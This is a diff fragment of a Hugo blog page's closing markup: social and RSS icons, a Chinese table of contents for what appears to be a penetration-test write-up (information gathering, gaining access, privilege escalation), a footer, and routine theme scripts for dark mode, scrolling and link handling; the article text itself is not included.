+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-过程">0x01 过程</a>
+      <ul>
+        <li><a href="#1信息收集">1、信息收集</a></li>
+        <li><a href="#2获取权限">2、获取权限</a></li>
+        <li><a href="#3提权">3、提权</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-总结">0x03 总结</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
